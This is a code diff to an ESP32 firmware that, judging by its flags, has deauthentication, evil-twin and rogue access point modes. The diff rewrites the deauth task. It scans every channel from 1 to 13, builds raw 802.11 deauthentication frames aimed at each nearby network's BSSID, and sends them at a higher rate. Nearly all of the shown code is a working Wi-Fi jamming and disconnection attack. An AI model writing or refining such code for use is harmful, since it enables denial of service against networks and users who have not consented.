@@ -17,7 +17,7 @@ static bool evilTwinOn = false;
 static bool rogueOn = false;
 static bool ledState = false;
 
-static struct Target {
+struct Target {
   String ssid;
   String bssid;
   int ch;
@@ -64,26 +64,31 @@ static void deauthTask(void* param) {
     for (int ch = 1; ch <= 13; ch++) {
       if (!attackOn) break;
       esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-      wifi_ap_record_t ap[20];
-      uint16_t count = 20;
-      esp_wifi_sta_get_ap_all(ap, &count);
-      for (int i = 0; i < count; i++) {
+      int n = WiFi.scanNetworks();
+      for (int i = 0; i < n; i++) {
         if (!attackOn) break;
-        uint8_t pkt[26] = {
-          0xC0, 0x00, 0x3A, 0x01,
-          0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-          0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-          0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-          0x00, 0x00, 0x01, 0x00
-        };
-        memcpy(&pkt[4], ap[i].bssid, 6);
-        memcpy(&pkt[16], ap[i].bssid, 6);
-        for (int j = 0; j < 10; j++) {
-          esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false);
-          delayMicroseconds(200);
+        if (WiFi.channel(i) == ch) {
+          uint8_t bssid[6];
+          String bssidStr = WiFi.BSSIDstr(i);
+          sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                 &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+          uint8_t pkt[26] = {
+            0xC0, 0x00, 0x3A, 0x01,
+            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x01, 0x00
+          };
+          memcpy(&pkt[4], bssid, 6);
+          memcpy(&pkt[16], bssid, 6);
+          for (int j = 0; j < 15; j++) {
+            esp_wifi_80211_tx(WIFI_IF_AP, pkt, 26, false);
+            delayMicroseconds(100);
+          }
         }
       }
-      delay(10);
+      WiFi.scanDelete();
+      delay(5);
     }
   }
   Serial.println("Deauth stopped");
